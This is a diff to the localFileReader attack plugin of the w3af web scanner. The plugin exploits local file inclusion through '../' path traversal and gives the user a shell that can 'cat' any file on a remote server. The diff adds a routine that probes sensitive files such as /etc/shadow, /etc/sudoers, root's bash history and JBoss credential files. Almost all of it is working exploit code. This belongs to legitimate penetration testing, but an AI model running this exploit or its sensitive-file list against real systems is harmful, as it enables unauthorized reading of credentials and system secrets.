@@ -33,6 +33,7 @@ from core.data.kb.shell import shell as shell
 
 from core.controllers.w3afException import w3afException
 import core.data.parsers.urlParser as urlParser
+from core.data.fuzzer.fuzzer import createRandAlNum
 
 class localFileReader(baseAttackPlugin):
     '''
@@ -66,49 +67,60 @@ class localFileReader(baseAttackPlugin):
             kb.kb.append( 'localFileInclude', 'localFileInclude', v )
     
     def getAttackType(self):
+        '''
+        @return: The type of attack: shell/proxy/etc.
+        '''
         return 'shell'
     
     def getVulnName2Exploit( self ):
+        '''
+        @return: Key to search in the kb.
+        '''
         return 'localFileInclude'
         
-    def _generateShell( self, vuln ):
+    def _generateShell( self, vuln_obj ):
         '''
-        @parameter vuln: The vuln to exploit.
+        @parameter vuln_obj: The vuln to exploit.
         @return: The shell object based on the vulnerability that was passed as a parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln ):
+        if self._verifyVuln( vuln_obj ):
             
-            if vuln.getMethod() != 'POST' and self._changeToPost and self._verifyVuln( self.GET2POST( vuln ) ):
-                om.out.information('The vulnerability was found using method GET, but POST is being used during this exploit.')
-                vuln = self.GET2POST( vuln )
+            if vuln_obj.getMethod() != 'POST' and self._changeToPost and \
+            self._verifyVuln( self.GET2POST( vuln_obj ) ):
+                msg = 'The vulnerability was found using method GET, but POST is being used during'
+                msg += ' this exploit.'
+                om.out.information( msg )
+                vuln_obj = self.GET2POST( vuln_obj )
             else:
-                om.out.information('The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.')
+                msg = 'The vulnerability was found using method GET, tried to change the method to'
+                msg += ' POST for exploiting but failed.'
+                om.out.information( msg )
             
             # Create the shell object
-            s = fileReaderShell( vuln )
-            s.setUrlOpener( self._urlOpener )
-            s.setCut( self._header, self._footer )
+            shell_obj = fileReaderShell( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            shell_obj.setCut( self._header, self._footer )
             
-            return s
+            return shell_obj
             
         else:
             return None
 
-    def _verifyVuln( self, vuln ):
+    def _verifyVuln( self, vuln_obj ):
         '''
         This command verifies a vuln. This is really hard work!
 
         @return : True if vuln can be exploited.
         '''
-        function_reference = getattr( self._urlOpener , vuln.getMethod() )
+        function_reference = getattr( self._urlOpener , vuln_obj.getMethod() )
         try:
-            response = function_reference( vuln.getURL(), str(vuln.getDc()) )
+            response = function_reference( vuln_obj.getURL(), str(vuln_obj.getDc()) )
         except w3afException, e:
             om.out.error( str(e) )
             return False
         else:
-            if self._defineCut( response.getBody(), vuln['file_pattern'], exact=False ):
+            if self._defineCut( response.getBody(), vuln_obj['file_pattern'], exact=False ):
                 return True
             else:
                 return False
@@ -132,7 +144,8 @@ class localFileReader(baseAttackPlugin):
         d3 = 'Data to send with fastExploit()'
         o3 = option('data', self._data, d3, 'string')
 
-        d4 = 'The file pattern to search for while verifiyng the vulnerability. Only used in fastExploit()'
+        d4 = 'The file pattern to search for while verifiyng the vulnerability.'
+        d4 += ' Only used in fastExploit()'
         o4 = option('file_pattern', self._file_pattern, d4, 'string')
 
         d5 = 'Exploit only one vulnerability.'
@@ -171,10 +184,10 @@ class localFileReader(baseAttackPlugin):
     
     def getRootProbability( self ):
         '''
-        @return: This method returns the probability of getting a root shell using this attack plugin.
-        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
-        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
-        return a root shell.
+        @return: This method returns the probability of getting a root shell using this attack
+        plugin. This is used by the "exploit *" function to order the plugins and first try to
+         exploit the more critical ones. This method should return 0 for an exploit that will 
+        never return a root shell, and 1 for an exploit that WILL ALWAYS return a root shell.
         '''
         return 0.0
         
@@ -183,25 +196,32 @@ class localFileReader(baseAttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits local file inclusion and let's you "cat" every file you want. Remember, if the file
-        in being read with an "include()" statement, you wont be able to read the source code of the script 
-        file, you will end up reading the result of the script interpretation. You can also use the "list" command
-        to list all files inside the known paths.
+        This plugin exploits local file inclusion and let's you "cat" every file you want. 
+        Remember, if the file in being read with an "include()" statement, you wont be able 
+        to read the source code of the script file, you will end up reading the result of the
+        script interpretation. You can also use the "list" command to list all files inside 
+        the known paths.
         
         One configurable parameters exist:
             - changeToPost
         '''
         
 class fileReaderShell(shell):
-    
+    '''
+    A shell object to exploit local file include and local file read vulns.
+
+    @author: Andres Riancho ( andres.riancho@gmail.com )
+    '''
+
     def help( self, command ):
         '''
         Handle the help command.
         '''
+        om.out.console('')
         om.out.console('Available commands:')
         om.out.console('    help                            Display this information')
         om.out.console('    cat                             Show the contents of a file')
-        om.out.console('    list                            (if possible) List the contents of a directory')
+        om.out.console('    list                            List files that may be interesting.')
         om.out.console('    endInteraction                  Exit the shell session')
         om.out.console('')
         om.out.console('All the other commands are executed on the remote server.')
@@ -215,29 +235,36 @@ class fileReaderShell(shell):
         @parameter command: The command to send ( cat is the only supported command. ).
         @return: The result of the command.
         '''
-        # Check that the command is cat and it has a param
+
+        # Get the command and the parameters
         cmd = command.split(' ')[0]
+        parameters = command.split(' ')[1:]
+
+        # Select the correct handler
         if cmd == 'list':
             return self._list()
-        elif cmd == 'cat':
-            try:
-                file = command.split(' ')[1]
-            except:
-                self.help( command )
-                return ''
-            else:
-                return self._cat( file )
+        elif cmd == 'cat' and len(parameters) == 1:
+            filename = parameters[0]
+            return self._cat( filename )
+        else:
+            self.help( command )
+            return ''
             
     def _cat( self, filename ):
-        # Do it
+        '''
+        Read a file and echo it's content.
+
+        @return: The file content.
+        '''
+        # TODO: Review this hack
         filename = '../' * 15 + filename
 
         # Lets send the command.
         function_reference = getattr( self._urlOpener , self.getMethod() )
-        dc = self.getDc()
-        dc[ self.getVar() ] = filename
+        data_container = self.getDc()
+        data_container[ self.getVar() ] = filename
         try:
-            response = function_reference( self.getURL() ,  str(dc) )
+            response = function_reference( self.getURL() ,  str(data_container) )
         except w3afException, e:
             return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
         else:
@@ -249,17 +276,78 @@ class fileReaderShell(shell):
         of the full paths of all files in the webroot, this is the result of
         that guess
         '''
-        pathDiscList = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
+        path_disc_list = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
         
         res = ''
-        if not pathDiscList:
-            res = 'Not enough path disclosure information was collected to return meaningful information.'
-        else:
-            for path in pathDiscList:
-                res += path +'\n'
-        
+        for path in path_disc_list:
+            res += path +'\n'
+
+        # Now I try to get a lot of common files from a database, and if they work
+        # I add them to the response string.
+
+        # First, we try with a non existant file, in order to have something to compare with
+        rand = createRandAlNum(8)
+        non_existant = self._cat( rand )
+        non_existant = non_existant.replace( rand, '')
+
+        # Please wait...
+        om.out.console('Please wait, this process may take a while')
+
+        for path_file in self._get_common_files( self._rOS ):
+            read_result = self._cat( path_file )
+            read_result = read_result.replace( path_file, '')
+            if read_result != non_existant:
+                res += path_file +'\n'
+            om.out.console('.', newLine = False)
+
+        res = res[:-1]
+
         return res
-            
+
+    def _get_common_files(self, remote_os):
+        '''
+        @return: A list of common files for the remote_os system.
+        '''
+        # TODO: maybe this should be on a different file, where all the framework
+        # can access it?
+        res = []
+
+        if remote_os == 'linux':
+            # Common files
+            res.append('/etc/passwd')
+            res.append('/etc/inetd.conf')
+            res.append('/etc/xinetd.conf')
+            res.append('/etc/shadow')
+
+            # Different apache configs and scripts
+            res.append('/etc/init.d/apache2')
+            res.append('/etc/apache2/httpd.conf')
+            res.append('/etc/httpd/conf/httpd.conf')
+            res.append('/opt/jboss4/server/default/conf/users.properties')
+
+            # Services and stuff
+            res.append('/etc/crontab')
+            res.append('/etc/sudoers')
+            res.append('/etc/bash.bashrc')
+            res.append('/etc/fstab')
+            res.append('/etc/motd')
+            res.append('/etc/environment')
+            res.append('/etc/hosts.allow')
+            res.append('/etc/hosts.deny')
+            res.append('/etc/hosts')
+
+            # bash history files
+            res.append('/root/.bash_history')
+            res.append('/var/www/.bash_history')
+            res.append('/home/www/.bash_history')
+            res.append('/home/apache/.bash_history')
+            res.append('/home/nobody/.bash_history')
+            res.append('/.bash_history')
+            res.append('/tmp/.bash_history')
+
+        # TODO: Complete this list with windows stuff
+        return res
+
     def _filter_errors( self, result ):
         '''
         Filter out ugly php errors and print a simple "Permission denied" or "File not found"
@@ -276,6 +364,9 @@ class fileReaderShell(shell):
         return result
     
     def end( self ):
+        '''
+        Cleanup. In this case, do nothing.
+        '''
         om.out.debug('fileReaderShell cleanup complete.')
         
     def _identifyOs( self ):
@@ -294,6 +385,9 @@ class fileReaderShell(shell):
         self._rUser = 'file-reader'
     
     def __repr__( self ):
+        '''
+        @return: A string representation of this shell.
+        '''
         if not self._rOS:
             self._identifyOs()
 
@@ -302,5 +396,8 @@ class fileReaderShell(shell):
     __str__ = __repr__
     
     def getName( self ):
+        '''
+        @return: The name of this shell.
+        '''
         return 'localFileReader'
         
